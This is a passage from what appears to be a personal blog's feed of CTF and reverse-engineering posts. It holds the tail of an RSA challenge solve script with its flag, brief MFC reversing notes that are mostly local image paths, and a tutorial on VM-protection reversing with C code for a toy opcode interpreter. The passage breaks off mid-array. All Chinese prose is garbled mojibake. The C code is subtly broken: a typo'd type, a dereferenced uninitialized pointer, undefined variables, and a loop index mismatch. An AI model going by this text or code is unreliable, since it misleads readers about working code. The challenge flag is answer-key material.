class="number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;factordb.com_is_strong!&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NSSCTF&quot;&gt;&lt;a href=&quot;#NSSCTF&quot; class=&quot;headerlink&quot; title=&quot;NSSCTF&quot;&gt;&lt;/a&gt;NSSCTF&lt;/h1&gt;&lt;h3 id=&quot;SWPUCTF-2021-æ–°ç”Ÿèµ›-ç®€ç®€å•å•çš„é€»è¾‘&quot;&gt;&lt;a href=&quot;#SWPUCTF-2021-</summary>
      
    
    
    
    
    <category term="NSSCTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/NSSCTF/"/>
    
  </entry>
  
  <entry>
    <title>MFCå›¾å½¢åŒ–ç•Œé¢</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/04/13/MFC%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/04/13/MFC%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/</id>
    <published>2024-04-12T16:00:00.000Z</published>
    <updated>2024-09-16T07:53:04.420Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MFCå›¾å½¢åŒ–ç•Œé¢"><a href="#MFCå›¾å½¢åŒ–ç•Œé¢" class="headerlink" title="MFCå›¾å½¢åŒ–ç•Œé¢"></a>MFCå›¾å½¢åŒ–ç•Œé¢</h1><h2 id="windowsæ¡Œé¢åº”ç”¨ç¼–ç¨‹"><a href="#windowsæ¡Œé¢åº”ç”¨ç¼–ç¨‹" class="headerlink" title="windowsæ¡Œé¢åº”ç”¨ç¼–ç¨‹"></a>windowsæ¡Œé¢åº”ç”¨ç¼–ç¨‹</h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202804698.png" alt="image-20240203202804698"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202813056.png" alt="image-20240203202813056"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202823482.png" alt="image-20240203202823482"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202851227.png" alt="image-20240203202851227"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202903575.png" alt="image-20240203202903575"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202911473.png" alt="image-20240203202911473"></p><h2 id="MFC-æ­£å‘å¼€å‘"><a href="#MFC-æ­£å‘å¼€å‘" class="headerlink" title="MFC æ­£å‘å¼€å‘"></a><strong>MFC</strong> <strong>æ­£å‘å¼€å‘</strong></h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202925910.png" alt="image-20240203202925910"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202934106.png" alt="image-20240203202934106"></p><h2 id="é€†å‘æ€è·¯"><a href="#é€†å‘æ€è·¯" class="headerlink" title="é€†å‘æ€è·¯"></a><strong>é€†å‘æ€è·¯</strong></h2><ul><li><p>é€šè¿‡ ResourceHacker å¯ä»¥è·å–æ§ä»¶çš„ ID å·ã€ä¿®æ”¹æ§ä»¶å¸ƒå±€ç­‰</p></li><li><p>é€šè¿‡ xspy å¯ä»¥è·å–æ§ä»¶æ¶ˆæ¯æ‰€å¯¹åº”çš„å¤„ç†å‡½æ•°åœ°å€</p></li><li><p>é€šè¿‡ GetDlgItem &#x2F; GetDlgItemText &#x2F; GetDlgItemInt &#x2F; GetWindowText ç³»åˆ— API æ‰¾åˆ°å…³é”®å‡½æ•°</p></li></ul><p>æ‰¾åˆ°å…³é”®å‡½æ•°åï¼Œå³ä¸ºå¸¸è§„é€†å‘</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MFCå›¾å½¢åŒ–ç•Œé¢&quot;&gt;&lt;a href=&quot;#MFCå›¾å½¢åŒ–ç•Œé¢&quot; class=&quot;headerlink&quot; title=&quot;MFCå›¾å½¢åŒ–ç•Œé¢&quot;&gt;&lt;/a&gt;MFCå›¾å½¢åŒ–ç•Œé¢&lt;/h1&gt;&lt;h2 id=&quot;windowsæ¡Œé¢åº”ç”¨ç¼–ç¨‹&quot;&gt;&lt;a href=&quot;#windowsæ¡Œé¢åº”ç”¨ç¼–ç¨‹&quot; c</summary>
      
    
    
    
    
    <category term="MFC" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/MFC/"/>
    
  </entry>
  
  <entry>
    <title>VMå­¦ä¹ </title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/31/VM/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/31/VM/</id>
    <published>2024-03-30T16:00:00.000Z</published>
    <updated>2024-09-16T07:15:39.605Z</updated>
    
    <content type="html"><![CDATA[<h3 id="é‚£CTFï¼Œé‚£VMreï¼Œé‚£äº›äº‹ï¼ˆä¸€ï¼‰"><a href="#é‚£CTFï¼Œé‚£VMreï¼Œé‚£äº›äº‹ï¼ˆä¸€ï¼‰" class="headerlink" title="é‚£CTFï¼Œé‚£VMreï¼Œé‚£äº›äº‹ï¼ˆä¸€ï¼‰"></a>é‚£CTFï¼Œé‚£VMreï¼Œé‚£äº›äº‹ï¼ˆä¸€ï¼‰</h3><p>  vmè™šæ‹Ÿæœºä¿æŠ¤é€†å‘ï¼Œæ˜¯ä¸€ç§åˆ©ç”¨äº†è™šæ‹ŸæœºæŠ€æœ¯çš„ä¸€ç§ç‰¹æ®ŠåŠ èŠ±æŒ‡ä»¤æ–¹å¼ã€‚ç›®å‰æ¯”èµ›ä¸­ï¼Œè™šæ‹Ÿæœºé¢˜ç›®ç‰¹ç‚¹æ˜¯æ ¸å¿ƒç®—æ³•ä¸æ˜¯å¾ˆå¤æ‚ï¼Œè™šæ‹Ÿæœºæœ¬èº«æ²¡æœ‰åè°ƒè¯•å’Œä»£ç åŠ å¯†æ··æ·†çš„åŠ å…¥ã€‚å¤§éƒ¨åˆ†é¢˜ç›®çš„æ€è·¯éƒ½æ˜¯è€ƒå¯Ÿåˆ†æswitchè¯­å¥åŠå…¶åˆ†æ”¯ã€‚                    </p><h2 id="0x00å‰è¨€"><a href="#0x00å‰è¨€" class="headerlink" title="0x00å‰è¨€"></a>0x00å‰è¨€</h2><p>æœ€è¿‘åšé¢˜åˆ·åˆ°äº†2020ç½‘é¼æ¯ä¸€é“vmè™šæ‹Ÿæœºä¿æŠ¤çš„reé¢˜ç›®ï¼Œé‚å†³å®šç³»ç»Ÿçš„å­¦ä¹ ä¸€ä¸‹vmè™šæ‹Ÿæœºä¿æŠ¤é€†å‘çš„ç›¸å…³çŸ¥è¯†ã€‚æ¯•ç«Ÿvmé€†å‘åœ¨å„å¤§æ¯”èµ›ä¸­åŠ¿å¤´æ­£ç››ã€‚</p><p>é¢˜ç›®é™„ä»¶åœ¨æ–‡ç« æœ«å°¾ã€‚éœ€è¦çš„å¤§ä½¬å¯ä»¥ä¸‹è½½å­¦ä¹ ä¸€ä¸‹ã€‚</p><h2 id="0x01ä»€ä¹ˆæ˜¯è™šæ‹Ÿæœºï¼Ÿä»€ä¹ˆæ˜¯vmï¼Ÿ"><a href="#0x01ä»€ä¹ˆæ˜¯è™šæ‹Ÿæœºï¼Ÿä»€ä¹ˆæ˜¯vmï¼Ÿ" class="headerlink" title="0x01ä»€ä¹ˆæ˜¯è™šæ‹Ÿæœºï¼Ÿä»€ä¹ˆæ˜¯vmï¼Ÿ"></a>0x01ä»€ä¹ˆæ˜¯è™šæ‹Ÿæœºï¼Ÿä»€ä¹ˆæ˜¯vmï¼Ÿ</h2><p>å­¦ä¹ è™šæ‹Ÿæœºé€†å‘ï¼Œé¦–å…ˆè¦äº†è§£ä»€ä¹ˆæ˜¯è™šæ‹Ÿæœºã€‚æŒ‰ç…§æˆ‘ä¹‹å‰çš„ç²—æµ…ç†è§£ï¼Œè™šæ‹Ÿæœºæ˜¯å¯„ç”Ÿäºå®¿ä¸»ç”µè„‘ä¸Šçš„ä¸€å°è™šæ‹Ÿç”µè„‘ï¼Œæ¥æ»¡è¶³ä½¿ç”¨è€…å…³äºå¤šä¸ªæ“ä½œç³»ç»Ÿé…åˆã€å±é™©è½¯ä»¶éš”ç¦»åˆ†æç­‰ç­‰éœ€æ±‚çš„æŠ€æœ¯ã€‚å½“ç„¶è¿™æ˜¯ä¸ªäººç†è§£ï¼Œä»…ä¾›å‚è€ƒã€‚è€Œåœ¨å¤§ä½¬åšå®¢ä¸­ï¼Œæˆ‘çœ‹åˆ°äº†å¦‚ä¸‹ç²¾å½©çš„å®šä¹‰ï¼š</p><blockquote><p>è™šæ‹Ÿæœºï¼šè‡ªå·±å®šä¹‰ä¸€å¥—æŒ‡ä»¤ï¼Œåœ¨ç¨‹åºä¸­èƒ½æœ‰ä¸€å¥—å‡½æ•°å’Œç»“æ„è§£é‡Šè‡ªå·±å®šä¹‰çš„æŒ‡ä»¤å¹¶æ‰§è¡ŒåŠŸèƒ½ã€‚</p></blockquote><p>ä¸Šè¿°å®šä¹‰å°†è™šæ‹Ÿæœºçš„åŸç†è®²çš„å¾ˆé€å½»äº†ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¯´è¯´ä»€ä¹ˆæ˜¯vmã€‚é¦–å…ˆç»™å‡ºå®˜æ–¹å®šä¹‰</p><blockquote><p>vmï¼ˆè™šæ‹Ÿæœºä¿æŠ¤ï¼‰æ˜¯ä¸€ç§åŸºäºè™šæ‹Ÿæœºçš„ä»£ç ä¿æŠ¤æŠ€æœ¯ã€‚ä»–å°†åŸºäºx86æ±‡ç¼–ç³»ç»Ÿä¸­çš„å¯æ‰§è¡Œä»£ç è½¬æ¢ä¸ºå­—èŠ‚ç æŒ‡ä»¤ç³»ç»Ÿçš„ä»£ç ã€‚æ¥è¾¾åˆ°ä¸è¢«è½»æ˜“ç¯¡æ”¹å’Œé€†å‘çš„ç›®çš„ã€‚</p></blockquote><p>ç®€å•æ¥è¯´å°±æ˜¯å‡ºé¢˜äººé€šè¿‡å®ç°ä¸€ä¸ªå°å‹çš„è™šæ‹Ÿæœºï¼ŒæŠŠç¨‹åºçš„ä»£ç è½¬æ¢ä¸ºç¨‹åºè®¾è®¡è€…è‡ªå®šä¹‰çš„æ“ä½œç ï¼ˆopcodeï¼‰ç„¶ååœ¨ç¨‹åºæ‰§è¡Œæ—¶é€šè¿‡è§£é‡Šæ“ä½œç ï¼Œæ‰§è¡Œå¯¹åº”çš„å‡½æ•°ï¼Œä»è€Œå®ç°ç¨‹åºåŸæœ‰çš„åŠŸèƒ½ã€‚</p><p>ä¸‹å›¾æ˜¯ä¸€ä¸ªä¸€èˆ¬è™šæ‹Ÿæœºç»“æ„</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-62df7fdcb0d174e10d09b59fd6af5df5ce0840e5.png" alt="æœªå‘½åæ–‡ä»¶.png"></p><p>å¯¹äºä¸Šå›¾å‡ºç°çš„æ¦‚å¿µçš„è§£é‡Š:</p><blockquote><p><strong>VMRUN</strong>:è™šæ‹Ÿæœºå…¥å£å‡½æ•°<br> <strong>dispatcher</strong>ï¼šè°ƒåº¦å™¨ï¼Œç”¨äºè§£é‡Šopcodeï¼Œå¹¶é€‰æ‹©å¯¹åº”çš„Handlerå‡½æ•°æ‰§è¡Œï¼Œå½“Handleræ‰§è¡Œå®Œåä¼šè·³å›è¿™é‡Œï¼Œå½¢æˆä¸€ä¸ªå¾ªç¯ã€‚<br> <strong>opcode</strong>ï¼šç¨‹åºå¯æ‰§è¡Œä»£ç è½¬æ¢æˆçš„æ“ä½œç <br> <strong>Handler</strong>ï¼šå„ç§åŠŸèƒ½å¯¹è±¡æ¨¡å—</p></blockquote><p>å½“ç„¶è¿™é‡Œçš„è™šæ‹Ÿæœºå¹¶ä¸æ˜¯æŒ‡VMWare\VirtualBoxä¹‹ç±»çš„è™šæ‹Ÿæœºï¼Œå®ƒæ›´åƒæ˜¯ä¸€ä¸ªç”¨äºè§£é‡Šç³»ç»Ÿå‡½æ•°çš„ä¸€ä¸ªå°å‹æ¨¡æ‹Ÿå™¨ã€‚</p><h2 id="0x02å‡ºé¢˜äººå¦‚ä½•å®ç°vmreå°å‹è™šæ‹Ÿæœº"><a href="#0x02å‡ºé¢˜äººå¦‚ä½•å®ç°vmreå°å‹è™šæ‹Ÿæœº" class="headerlink" title="0x02å‡ºé¢˜äººå¦‚ä½•å®ç°vmreå°å‹è™šæ‹Ÿæœº"></a>0x02å‡ºé¢˜äººå¦‚ä½•å®ç°vmreå°å‹è™šæ‹Ÿæœº</h2><p>æƒ³è¦ææ¸…æ¥šè™šæ‹Ÿæœºä¿æŠ¤reé¦–å…ˆè¦ææ¸…æ¥šç”¨äºä¿æŠ¤çš„è™šæ‹Ÿæœºæ˜¯å¦‚ä½•å®ç°çš„ã€‚</p><p>è¦æƒ³å®ç°è™šæ‹Ÿæœºçš„è¯éœ€è¦å®Œæˆä¸¤ä¸ªç›®æ ‡ï¼š<br> 1.å®šä¹‰ä¸€å¥—opcode<br> 2.å®ç°opcodeçš„è§£é‡Šå™¨</p><h3 id="åˆå§‹åŒ–è™šæ‹Ÿå¯„å­˜å™¨ã€opcodeå­˜æ”¾"><a href="#åˆå§‹åŒ–è™šæ‹Ÿå¯„å­˜å™¨ã€opcodeå­˜æ”¾" class="headerlink" title="åˆå§‹åŒ–è™šæ‹Ÿå¯„å­˜å™¨ã€opcodeå­˜æ”¾"></a>åˆå§‹åŒ–è™šæ‹Ÿå¯„å­˜å™¨ã€opcodeå­˜æ”¾</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    unsigned long r1;    <span class="comment">//è™šæ‹Ÿå¯„å­˜å™¨r1</span></span><br><span class="line">    unsigned long r2;    <span class="comment">//è™šæ‹Ÿå¯„å­˜å™¨r2</span></span><br><span class="line">    unsigned long r3;    <span class="comment">//è™šæ‹Ÿå¯„å­˜å™¨r3</span></span><br><span class="line">    unsigned char *eip;    <span class="comment">//æŒ‡å‘æ­£åœ¨è§£é‡Šçš„opcodeåœ°å€</span></span><br><span class="line">    vm_opcode op_list[OPCODE_N];    <span class="comment">//opcodeåˆ—è¡¨ï¼Œå­˜æ”¾äº†æ‰€æœ‰çš„opcodeåŠå…¶å¯¹åº”çš„å¤„ç†å‡½æ•°</span></span><br><span class="line">&#125;vm_cpu;</span><br></pre></td></tr></table></figure><p>r1-r3ç”¨æ¥ä¼ å‚æˆ–è€…æ˜¯å­˜æ”¾è¿”å›å€¼,eipæŒ‡å‘opcodeçš„åœ°å€</p><h3 id="å®šä¹‰opcode"><a href="#å®šä¹‰opcode" class="headerlink" title="å®šä¹‰opcode"></a>å®šä¹‰opcode</h3><p>opcodeåªæ˜¯ä¸€ä¸ªæ ‡è¯†ï¼Œå¯ä»¥éšä¾¿å®šä¹‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char opcode;</span><br><span class="line">    <span class="keyword">void</span> (*handle)(<span class="keyword">void</span>*);</span><br><span class="line">&#125;vm_opcode;</span><br></pre></td></tr></table></figure><h3 id="å…³è”opcodeå’Œå¯¹åº”handlerå‡½æ•°"><a href="#å…³è”opcodeå’Œå¯¹åº”handlerå‡½æ•°" class="headerlink" title="å…³è”opcodeå’Œå¯¹åº”handlerå‡½æ•°"></a>å…³è”opcodeå’Œå¯¹åº”handlerå‡½æ•°</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *<span class="title function_ invoke__">vm_init</span>()</span><br><span class="line">&#123;</span><br><span class="line">    vm_vpu *cpu;</span><br><span class="line">    cpu-&gt;r1 = <span class="number">0</span>;</span><br><span class="line">    cpu-&gt;r2 = <span class="number">0</span>;</span><br><span class="line">    cpu-&gt;r3 = <span class="number">0</span>;</span><br><span class="line">    cpu-&gt;eip = (unsigned char *)vm_code;<span class="comment">//å°†eipæŒ‡å‘opcodeçš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">    cpu-&gt;op_list[<span class="number">0</span>].opcode = <span class="number">0xf1</span>;</span><br><span class="line">    cpu-&gt;op_list[<span class="number">0</span>].handle = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *))mov;<span class="comment">//å°†æ“ä½œå­—èŠ‚ç ä¸å¯¹åº”çš„handleå‡½æ•°å…³è”åœ¨ä¸€èµ·</span></span><br><span class="line"></span><br><span class="line">    cpu-&gt;op_list[<span class="number">1</span>].opcode = <span class="number">0xf2</span>;</span><br><span class="line">    cpu-&gt;op_list[<span class="number">1</span>].handle = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *))<span class="keyword">xor</span>;</span><br><span class="line"></span><br><span class="line">    cpu-&gt;op_list[<span class="number">2</span>].opcode = <span class="number">0xf5</span>;</span><br><span class="line">    cpu-&gt;op_list[<span class="number">2</span>].handle = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *))read_;</span><br><span class="line"></span><br><span class="line">    vm_stack = <span class="title function_ invoke__">malloc</span>(<span class="number">0x512</span>);</span><br><span class="line">    <span class="title function_ invoke__">memset</span>(vm_stack,<span class="number">0</span>,<span class="number">0x512</span>);<span class="comment">//å®šä¹‰äº†ä¸€ä¸ªæ–°æ ˆå¹¶åœ¨mallocä¸Šç”³è¯·äº†0x512ä½çš„ç©ºé—´</span></span><br></pre></td></tr></table></figure><h3 id="è™šæ‹Ÿæœºå…¥å£å‡½æ•°"><a href="#è™šæ‹Ÿæœºå…¥å£å‡½æ•°" class="headerlink" title="è™šæ‹Ÿæœºå…¥å£å‡½æ•°"></a>è™šæ‹Ÿæœºå…¥å£å‡½æ•°</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">vm_start</span>(vm_cpu *cpu)</span><br><span class="line">&#123;</span><br><span class="line">    cpu-&gt;eip = (unsigned char*)opcodes;<span class="comment">//eipæŒ‡å‘è¦è¢«è§£é‡Šçš„opcodeåœ°å€</span></span><br><span class="line">    <span class="keyword">while</span>((*cpu-&gt;eip) != <span class="number">0xf4</span>)<span class="comment">//å¦‚æœopcodeä¸ä¸ºRETï¼Œå°±è°ƒç”¨vm_dispatcheræ¥è§£é‡Šæ‰§è¡Œ</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">vm_dispatcher</span>(*cpu-&gt;eip)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="è§£é‡Šæ‰§è¡Œå™¨ç¼–å†™"><a href="#è§£é‡Šæ‰§è¡Œå™¨ç¼–å†™" class="headerlink" title="è§£é‡Šæ‰§è¡Œå™¨ç¼–å†™"></a>è§£é‡Šæ‰§è¡Œå™¨ç¼–å†™</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">vm_dispatcher</span>(vm_cpu *cpu)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;OPCODE_N;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(*cpu-&gt;eip ==cpu-&gt;op_list[i].opcode)</span><br><span class="line">        &#123;</span><br><span class="line">            cpu-&gt;op_list[i].<span class="title function_ invoke__">handle</span>(cpu);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å…·ä½“æ‰§è¡Œå‡½æ•°å®ç°"><a href="#å…·ä½“æ‰§è¡Œå‡½æ•°å®ç°" class="headerlink" title="å…·ä½“æ‰§è¡Œå‡½æ•°å®ç°"></a>å…·ä½“æ‰§è¡Œå‡½æ•°å®ç°</h3><p>è¿™é‡Œå®ç° mov xor read ä¸‰ä¸ªç®€å•çš„æŒ‡ä»¤ å…¶ä¸­readæŒ‡ä»¤ç”¨äºè¯»å–æ•°æ® åœ¨é¢˜ç›®ä¸­ç”¨äºè¯»å–flagã€‚å…·ä½“é¢˜ç›®ä¸­æ ¹æ®é¢˜ç›®è¦æ±‚å®ç°ä¸åŒçš„å‡½æ•°åŠŸèƒ½å³å¯ã€‚æ‰€ä»¥è¯´è™šæ‹Ÿæœºç±»reé¢˜ç›®å¾ˆå¥½çš„è€ƒå¯Ÿäº†å‚èµ›é€‰æ‰‹çš„ä»£ç èƒ½åŠ›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="keyword">xor</span>(vm_cpu *cpu)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    num =cpu-&gt;r1 ^cpu-&gt;r2;</span><br><span class="line">    num ^=<span class="number">0x12</span>;</span><br><span class="line">    cpu-&gt;r1= temp;</span><br><span class="line">    cpu-&gt;eip=eip+<span class="number">1</span>;<span class="comment">//è¿™é‡Œä¸€å®šè¦æ³¨æ„xoræŒ‡ä»¤æœ¬èº«æ˜¯å ä¸€ä¸ªå­—èŠ‚çš„ã€‚</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">mov</span>(vm_cpu *cpu)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*movæŒ‡ä»¤çš„å‚æ•°éƒ½éšè—åœ¨å­—èŠ‚ç ä¸­ï¼ŒæŒ‡ä»¤è¡¨ç¤ºåçš„ä¸€ä¸ªå­—èŠ‚æ˜¯å¯„å­˜å™¨æ ‡è¯†ï¼Œç¬¬äºŒåˆ°ç¬¬äº”æ˜¯è¦movçš„æ•°æ®åœ¨vm_stackä¸Šçš„åç§»ã€‚è¿™é‡Œåªå®ç°äº†ä»vm_stackæ ˆä¸Šå­˜å–æ•°æ®*/</span></span><br><span class="line">    unsigned char *res =cpu-&gt;eip+<span class="number">1</span>;<span class="comment">//å¯„å­˜å™¨æ ‡è¯†</span></span><br><span class="line">    <span class="keyword">int</span> *offset = (<span class="keyword">int</span> *)(cpu-&gt;eip+<span class="number">2</span>);</span><br><span class="line">    char *dest=<span class="number">0</span>;</span><br><span class="line">    dest=vm_stack;</span><br><span class="line">    <span class="keyword">switch</span>(*res)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe1</span>:</span><br><span class="line">        cpu-&gt;r1=*(dest + *offset);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe2</span>:</span><br><span class="line">        cpu-&gt;r2=*(dest + *offset);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe3</span>:</span><br><span class="line">        cpu-&gt;r3=*(dest + *offset);</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//æ•°æ®å¯„å­˜</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe4</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> x=cpu-&gt;r1;</span><br><span class="line">                *(dest + *offset)=x;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="comment">//è·å–å¯„å­˜å™¨ä¸­æ•°æ®</span></span><br><span class="line">    &#125;</span><br><span class="line">    cpu-&gt;eip += <span class="number">6</span>;<span class="comment">//movæŒ‡ä»¤å å…­ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥eipè¦å‘åç§»6ä½</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å®šä¹‰opcodeå­—ç¬¦é›†"><a href="#å®šä¹‰opcodeå­—ç¬¦é›†" class="headerlink" title="å®šä¹‰opcodeå­—ç¬¦é›†"></a>å®šä¹‰opcodeå­—ç¬¦é›†</h3><p>å®šä¹‰opcodeå­—ç¬¦é›†ï¼Œæ¯ä¸ªå­—ç¬¦å¯¹åº”ä¸€ä¸ªå‡½æ•°åŠŸèƒ½æ¨¡å—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">unsigned char vm_code[] = &#123;</span><br><span class="line">    <span class="number">0xf5</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x0</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x1</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x21</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x2</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x22</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x3</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x4</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x24</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x5</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x25</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span 